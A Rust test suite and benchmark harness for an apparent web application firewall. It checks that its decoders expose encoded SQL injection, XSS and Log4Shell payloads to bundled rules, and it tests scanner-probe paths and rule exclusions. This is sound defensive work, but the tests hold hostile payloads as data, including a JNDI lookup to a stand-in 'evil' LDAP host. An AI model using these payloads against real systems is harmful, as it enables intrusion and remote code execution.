    fn shipped_rules_see_through_a_stray_invalid_escape() {
        // The same bypass against two instant-block rules from the bundled
        // sets, rather than a pattern written for the test: a junk parameter
        // carrying one byte that is not UTF-8 hid each attack from its rule.
        for (file, id, field) in [
            ("942-sqli.rules.toml", 942016, "q=%78p_cmdshell&z=%FF"),
            ("942-sqli.rules.toml", 942006, "q=drop%20table%20users&z=%C0"),
        ] {
            let re = Regex::new(&pattern(file, id)).unwrap();
            let forms = super::zone_text(field, true);
            assert!(forms.iter().any(|f| re.is_match(f)),
                    "rule {id} missed {field:?}; forms were {forms:?}");
        }
    }

    #[test]
    fn valid_encoding_decodes_exactly_as_before() {
        // The fix changes only what happens to invalid bytes.
        assert_eq!(super::percent_decode("caf%C3%A9"), "café");
        assert_eq!(super::percent_decode("a%20b%2Fc"), "a b/c");
        assert_eq!(super::percent_decode("plain"), "plain");
        assert_eq!(super::percent_decode("%2545"), "%45", "one level per call, as before");
        assert_eq!(super::percent_decode("100%"), "100%", "a stray percent is left alone");
    }

    #[test]
    fn html_entities_decode_the_way_libmodsecurity_does() {
        let d = super::html_entity_decode;
        assert_eq!(d("&lt;script&gt;"),      "<script>");
        assert_eq!(d("&#60;script&#62;"),    "<script>");
        assert_eq!(d("&#x3c;script&#X3E;"),  "<script>");
        assert_eq!(d("&quot;"),              "\"");

        // The semicolon is optional, to libmodsecurity as to a browser.
        assert_eq!(d("&lt&gt"),   "<>");
        assert_eq!(d("&#60&#62"), "<>");

        // Only five names are recognised, so everything else is text — and an
        // '&' between query parameters must come through untouched, or every
        // ordinary request would grow a second, wrong form.
        assert_eq!(d("&dollar;&lbrace;"), "&dollar;&lbrace;");
        assert_eq!(d("a=1&b=2"),          "a=1&b=2");
        assert_eq!(d("plain"),            "plain");
        assert!(!d("x&nbsp;y").contains("nbsp"), "a named entity was left whole");

        // Truncated to one byte, quirk included: a rule written against
        // libmodsecurity expects `&#256;` to be a NUL, not 'Ā'.
        assert_eq!(d("&#256;"), "\u{0}");
    }

    #[test]
    fn javascript_escapes_decode_the_way_libmodsecurity_does() {
        let d = super::js_decode;
        assert_eq!(d(r"\x3cscript\x3e"),   "<script>");
        assert_eq!(d(r"\u003cscript\u003e"), "<script>");
        assert_eq!(d(r"\74script\76"),     "<script>", "octal");
        assert_eq!(d(r"\n\t"),             "\n\t");

        // The full-width block folds onto ASCII, which is the whole reason
        // this matters: `\uff1c` is the '<' the XSS rules are looking for.
        // Only the escape is folded — a literal '＜' in the text is left alone,
        // as libmodsecurity leaves it.
        assert_eq!(d(r"\uff1cscript\uff1e"), "<script>");

        // An escape with no meaning keeps the character and loses the
        // backslash, so `\<script\>` reaches a rule as a tag.
        assert_eq!(d(r"\<script\>"), "<script>");

        assert_eq!(d("no escapes here"), "no escapes here");
        assert_eq!(d(r"trailing\"),      r"trailing\", "a lone backslash is text");
    }

    #[test]
    fn css_escapes_decode_the_way_libmodsecurity_does() {
        let d = super::css_decode;
        assert_eq!(d(r"\3c script"),    "<script", "one space ends the escape");
        assert_eq!(d(r"\00003cscript"), "<script", "six digits, low byte kept");
        assert_eq!(d("\\\n<script"),    "<script", "a line continuation is removed");
        assert_eq!(d(r"\<script"),      "<script");
        assert_eq!(d("nothing to do"),  "nothing to do");
    }

    #[test]
    fn percent_u_escapes_decode() {
        let d = super::url_decode_uni;
        assert_eq!(d("%u003cscript%u003e"), "<script>");
        assert_eq!(d("%uff1cscript"),       "<script", "full-width folds to ASCII");
        assert_eq!(d("%3Cscript%3E"),       "<script>", "ordinary escapes still decode");
        assert_eq!(d("100%"),               "100%");
        assert_eq!(d("%zz"),                "%zz");
    }

    #[test]
    fn shipped_rules_see_through_the_escapes_crs_declares() {
        // The XSS rules are written against text that has been through
        // htmlEntityDecode, jsDecode and cssDecode. EasyWAF undid none of them
        // before 0.11.0, so every one of these reached the rule as the escape
        // text it is, and matched nothing.
        let re = Regex::new(&pattern("941-xss.rules.toml", 941001)).unwrap();
        for field in [
            "q=&#60;script&#62;alert(1)",
            "q=&lt;script&gt;alert(1)",
            "q=&#x3c;script&#x3e;alert(1)",
            r"q=\x3cscript\x3ealert(1)",
            r"q=\u003cscript\u003ealert(1)",
            r"q=\uff1cscript\uff1ealert(1)",
            r"q=\<script\>alert(1)",
            "q=%u003cscript%u003e",
            // The entity itself percent-encoded, which is how it arrives from
            // a browser: the chain starts by undoing that.
            "q=%26lt%3Bscript%26gt%3B",
        ] {
            let forms = super::zone_text(field, true);
            assert!(forms.iter().any(|f| re.is_match(f)),
                    "rule 941001 missed {field:?}; forms were {forms:?}");
        }
    }

    #[test]
    fn log4shell_survives_the_escapes_it_hides_behind() {
        // CRS 944150 declares t:jsDecode,t:htmlEntityDecode, which is why the
        // converter refuses it and sets/1030-java says Log4Shell is not
        // covered. These are the forms it is written to see through.
        for field in [
            r"x=\u0024\u007bjndi:ldap://evil/a\u007d",
            "x=&#36;&#123;jndi:ldap://evil/a&#125;",
            "x=%24%7bjndi:ldap://evil/a%7d",
        ] {
            let forms = super::zone_text(field, true);
            assert!(forms.iter().any(|f| f.contains("${jndi:ldap://")),
                    "{field:?} never reduced to the payload: {forms:?}");
        }
    }

    #[test]
    fn ordinary_text_still_costs_one_form() {
        // The decoders run on every request, so text they cannot change must
        // not produce a second copy of itself for every rule to be matched
        // against twice.
        assert_eq!(super::zone_text("q=red running shoes", true).len(), 1);
        assert_eq!(super::zone_text("a=1&b=2", true), vec!["a=1&b=2".to_string()],
                   "an ampersand between parameters is not an entity");
        assert_eq!(super::zone_text("/static/app.js", false).len(), 1);
    }

    #[test]
    fn admin_probing_is_anchored_to_the_path_root() {
        let re = Regex::new(&pattern("913-scanners.rules.toml", 913015)).unwrap();

        // An application's own settings page is not someone probing for one.
        // Unanchored, Nextcloud's /index.php/settings/admin scored 4 every time
        // an administrator opened it.
        for benign in [
            "/index.php/settings/admin",
            "/index.php/settings/admin/overview",
            "/settings/admin/serverinfo",
            "/apps/admin_audit/js/x.js",
            "/index.php/apps/theming/manager",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }

        for probe in [
            "/admin", "/admin/", "/admin?x=1", "/wp-admin/install.php",
            "/phpmyadmin/", "/manager/html", "/actuator/env",
            "/.env", "/phpinfo.php", "/server-status", "/web.config",
        ] {
            assert!(re.is_match(probe), "missed {probe:?}");
        }

        // .git left this rule for 913016, which blocks rather than scores. One
        // request attributed to two rules for the same reason is harder to read
        // than either alone, so it must not be matched in both places.
        assert!(!re.is_match("/.git/config"), "913015 should no longer match .git");

        let git = Regex::new(&pattern("913-scanners.rules.toml", 913016)).unwrap();
        for probe in ["/.git", "/.git/", "/.git/config", "/app/.git/HEAD"] {
            assert!(git.is_match(probe), "913016 missed {probe:?}");
        }
        // Narrower than the rule it came from, because it blocks: a repository
        // served over HTTP and a file merely named .gitignore are not the same
        // thing.
        for benign in ["/.gitignore", "/.gitattributes", "/myrepo.git/info/refs"] {
            assert!(!git.is_match(benign), "913016 false positive on {benign:?}");
        }
    }

    #[test]
    fn the_sql_comment_rule_ignores_a_mime_wildcard() {
        let re = Regex::new(&pattern("942-sqli.rules.toml", 942007)).unwrap();
        // Every HTTP client sends this by default.
        assert!(!re.is_match("*/*"));
        assert!(!re.is_match("text/html, */*;q=0.8"));
        // Still catches comments used to truncate a query.
        assert!(re.is_match("' OR 1=1 --"));
        assert!(re.is_match("UNION/**/SELECT"));
    }

    // ── Exclusions ───────────────────────────────────────

    /// A rule as the engine holds it, for the matching tests below.
    fn rule(id: i64, external_id: Option<i64>) -> RuleRow {
        RuleRow {
            id,
            external_id,
            name:    "test".into(),
            zone:    "URL".into(),
            pattern: ".".into(),
            score:   5,
            action:  "score".into(),
        }
    }

    fn by_number(external_id: i64, prefix: &str) -> Exclusion {
        Exclusion {
            external_id: Some(external_id),
            rule_id: None,
            path_prefix: prefix.into(),
            client: None,
        }
    }

    fn ip(s: &str) -> std::net::IpAddr { s.parse().expect("a literal address") }

    fn for_client(external_id: i64, cidr: &str) -> Exclusion {
        Exclusion {
            external_id: Some(external_id),
            rule_id: None,
            path_prefix: String::new(),
            client: crate::forwarded::Cidr::parse(cidr),
        }
    }

    #[test]
    fn an_exclusion_silences_only_the_rule_it_names() {
        let ex = by_number(913015, "");
        assert!( ex.silences(&rule(1, Some(913015)), "/anything", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(2, Some(913016)), "/anything", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(3, None),         "/anything", ip("203.0.113.9")));
    }

    #[test]
    fn an_empty_prefix_means_the_whole_site() {
        let ex = by_number(913015, "");
        for path in ["/", "/admin", "/deep/nested/path"] {
            assert!(ex.silences(&rule(1, Some(913015)), path, ip("203.0.113.9")), "{path} should be covered");
        }
    }

    #[test]
    fn a_prefix_confines_the_exclusion_to_that_path() {
        let ex = by_number(913015, "/remote.php/dav/");
        assert!( ex.silences(&rule(1, Some(913015)), "/remote.php/dav/files/yariv/x", ip("203.0.113.9")));
        // The rule still runs everywhere else on the site, which is the whole
        // reason for having a prefix at all.
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/remote.php/other", ip("203.0.113.9")));
    }

    #[test]
    fn a_catalogue_rule_is_matched_by_number_not_by_row_id() {
        // Removing a set and installing it again rewrites every row with a new
        // id. The exclusion has to survive that, or it stops applying at the
        // moment the rule comes back — silently, and only in production.
        let ex = by_number(913015, "");
        assert!(ex.silences(&rule(7,   Some(913015)), "/x", ip("203.0.113.9")), "before a reinstall");
        assert!(ex.silences(&rule(914, Some(913015)), "/x", ip("203.0.113.9")), "after a reinstall");
    }

    #[test]
    fn a_custom_rule_is_matched_by_row_id_because_it_has_no_number() {
        let ex = Exclusion { external_id: None, rule_id: Some(42), path_prefix: "".into(), client: None };
        assert!( ex.silences(&rule(42, None), "/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(43, None), "/x", ip("203.0.113.9")));
        // A row id must never reach across to a catalogue rule that happens to
        // sit at the same id.
        assert!(!ex.silences(&rule(43, Some(42)), "/x", ip("203.0.113.9")));
    }

    #[test]
    fn a_client_block_confines_the_exclusion_to_that_client() {
        // The case this exists for: a rule is right, and one client trips it.
        // Everyone else must still be protected by it.
        let ex = for_client(913015, "203.0.113.0/24");
        assert!( ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.9")));
        assert!( ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.255")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.114.1")),
                "an address outside the block must still be caught by the rule");
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("198.51.100.7")));
    }

    #[test]
    fn a_single_address_excludes_only_that_address() {
        let ex = for_client(913015, "192.168.1.50");
        assert!( ex.silences(&rule(1, Some(913015)), "/x", ip("192.168.1.50")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/x", ip("192.168.1.51")));
    }

    #[test]
    fn no_client_block_still_means_every_client() {
        // Every row written before the column existed means this, so the
        // absence of a block must not start meaning "nobody".
        let ex = by_number(913015, "");
        for addr in ["203.0.113.9", "192.168.1.50", "::1"] {
            assert!(ex.silences(&rule(1, Some(913015)), "/x", ip(addr)),
                    "{addr} should be covered by an exclusion naming no client");
        }
    }

    #[test]
    fn a_v4_client_is_not_matched_by_a_v6_block_or_the_reverse() {
        // Cidr::contains refuses to cross families; asserted here because an
        // exclusion crossing them would be a hole rather than a mismatch.
        let v6 = for_client(913015, "::/0");
        assert!(!v6.silences(&rule(1, Some(913015)), "/x", ip("203.0.113.9")));
        let v4 = for_client(913015, "0.0.0.0/0");
        assert!(!v4.silences(&rule(1, Some(913015)), "/x", ip("::1")));
    }

    #[test]
    fn the_client_block_narrows_rather_than_replaces_the_path() {
        // Both conditions must hold. An exclusion naming a path and a client
        // applies where they intersect, not where either matches.
        let ex = Exclusion {
            external_id: Some(913015),
            rule_id: None,
            path_prefix: "/admin/".into(),
            client: crate::forwarded::Cidr::parse("203.0.113.0/24"),
        };
        assert!( ex.silences(&rule(1, Some(913015)), "/admin/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/other",   ip("203.0.113.9")),
                "right client, wrong path");
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin/x", ip("198.51.100.7")),
                "right path, wrong client");
    }

    #[test]
    fn a_row_naming_neither_rule_silences_nothing() {
        // The CHECK constraint makes this unreachable through the database.
        // If it were ever reached, the safe reading of "no rule named" is no
        // rule silenced — not every rule silenced.
        let ex = Exclusion { external_id: None, rule_id: None, path_prefix: "".into(), client: None };
        assert!(!ex.silences(&rule(1, Some(913015)), "/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, None),         "/x", ip("203.0.113.9")));
    }
}

// ─── Measurement harness ─────────────────────────────────
//
// Not a test of behaviour: a repeatable measurement of what inspection costs per
// request, which is the acceptance test for 0.11.0 — see
// docs/design/proxy-performance.md. Ignored by default because it is slow and
// its numbers only mean anything from a release build:
//
//     cargo test --release bench_ -- --ignored --nocapture
//
// It builds a throwaway database through the real migrations, installs N rules
// cycled from the shipped rule sets, and drives the modules exactly as the
// pipeline does. The request is benign — a percent-encoded query and a JSON
// body — because a hostile one stops at the first block rule and understates
// what a full pass over the rules costs.
#[cfg(test)]
mod bench {
    use super::*;
    use crate::modules::{geoip::GeoIpModule, InspectionModule, RequestContext};
    use std::time::{Duration, Instant};

    const WARMUP: usize = 30;
    const ROUNDS: usize = 300;

    /// Every (zone, pattern) in the shipped sets, so the patterns being timed
    /// are the ones that actually run rather than something written to be fast.
    fn shipped_rules() -> Vec<(String, String)> {
        let mut paths: Vec<_> = std::fs::read_dir("rules")
            .expect("rules/ — run from the repository root")
            .filter_map(|e| e.ok())
            .map(|e| e.path())
            .filter(|p| p.to_string_lossy().ends_with(".rules.toml"))
            .collect();
        paths.sort();

        let mut out = Vec::new();
        for p in paths {
            let table: toml::Table = std::fs::read_to_string(&p).unwrap().parse().unwrap();
            for r in table.get("rules").and_then(|r| r.as_array()).into_iter().flatten() {
                let zone = r.get("zone").and_then(|v| v.as_str()).unwrap_or("ANY");
                if let Some(pattern) = r.get("pattern").and_then(|v| v.as_str()) {
                    out.push((zone.to_string(), pattern.to_string()));
                }
            }
        }
        assert!(!out.is_empty(), "no rules found under rules/");
        out
    }

    fn remove_db(path: &std::path::Path) {
        for suffix in ["", "-wal", "-shm"] {
            let _ = std::fs::remove_file(format!("{}{suffix}", path.display()));
        }
    }

    /// A file database, not `sqlite::memory:` — an in-memory database is a
    /// separate one per pooled connection, so migrating one connection and
    /// querying another would time queries against an empty schema.
    async fn seeded(rule_count: usize) -> (SqlitePool, i64, std::path::PathBuf) {
        let path = std::env::temp_dir()
            .join(format!("easywaf-bench-{}-{rule_count}.db", std::process::id()));
        remove_db(&path);
        let db = crate::db::init(&format!("sqlite://{}", path.display())).await;

        let policy_id = sqlx::query(
            "INSERT INTO policies (name, rule_engine, score_threshold) VALUES ('bench', 'On', 1000000)",
        )
        .execute(&db).await.unwrap().last_insert_rowid();

        let site_id = sqlx::query(
            "INSERT INTO sites (name, server_name, target, waf_policy_id)
             VALUES ('bench', 'bench.example', 'http://127.0.0.1:1', ?)",
        )
        .bind(policy_id)
        .execute(&db).await.unwrap().last_insert_rowid();

        let shipped = shipped_rules();
        let mut tx = db.begin().await.unwrap();
        for i in 0..rule_count {
            let (zone, pattern) = &shipped[i % shipped.len()];
            // action 'score' throughout, so no rule ends the loop early.
            sqlx::query(
                "INSERT INTO waf_rules (policy_id, name, zone, pattern, score, action, enabled)
                 VALUES (?, ?, ?, ?, 1, 'score', 1)",
            )
            .bind(policy_id).bind(format!("bench {i}")).bind(zone).bind(pattern)
            .execute(&mut *tx).await.unwrap();
        }
        tx.commit().await.unwrap();
        (db, site_id, path)
    }

    fn request(site_id: i64) -> RequestContext {
        let mut headers = axum::http::HeaderMap::new();
        for (k, v) in [
            ("user-agent",   "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"),
            ("accept",       "application/json"),
            ("content-type", "application/json"),
            ("cookie",       "session=abc123; theme=dark"),
        ] {
            headers.insert(k, v.parse().unwrap());
        }
        RequestContext {
            site_id,
            site_name:  "bench".into(),
            client_ip:  "203.0.113.9".parse().unwrap(),
            method:     axum::http::Method::POST,
            host:       "bench.example".into(),
            path:       "/api/search".into(),
            query:      Some("q=red%20running%20shoes&size=42&sort=price%20asc".into()),
            headers,
            body:       bytes::Bytes::from_static(
                br#"{"user":"alice","comment":"looking for something in blue","items":[1,2,3]}"#,
            ),
            started_at: Instant::now(),
        }
    }

    fn micros(total: Duration) -> f64 {
        total.as_secs_f64() * 1e6 / ROUNDS as f64
    }

    /// Warm up, then time ROUNDS iterations of an async body, in µs per round.
    macro_rules! per_round {
        ($body:expr) => {{
            for _ in 0..WARMUP { $body; }
            let start = Instant::now();
            for _ in 0..ROUNDS { $body; }
            micros(start.elapsed())
        }};
    }

    #[tokio::test]
    #[ignore]
    async fn bench_per_request_cost() {
        if cfg!(debug_assertions) {
            eprintln!("\nnote: debug build — these numbers are not comparable; use --release");
        }
        println!("\n{:>6}  {:>11}  {:>11}  {:>11}",
                 "rules", "reads µs", "waf µs", "geoip µs");

        for n in [138usize, 1000, 5000] {
            let (db, site_id, path) = seeded(n).await;
            let ctx = request(site_id);
            let waf = WafModule::new(db.clone());
            let geo = GeoIpModule::new(db.clone());

            // The three reads inspect used to make on every request, timed on
            // their own for reference. Since 0.11.0 they run once per change.
            let db_work = per_round!({
                let p = get_site_policy(&db, site_id).await.expect("policy");
                let _ = get_rules(&db, p.id).await;
                let _ = get_exclusions(&db, site_id).await;
            });
            let waf_total = per_round!({ let _ = waf.inspect(&ctx).await; });
            let geo_total = per_round!({ let _ = geo.inspect(&ctx).await; });

            println!("{:>6}  {:>11.0}  {:>11.0}  {:>11.0}",
                     n, db_work, waf_total, geo_total);

            db.close().await;
            remove_db(&path);
        }
    }
}
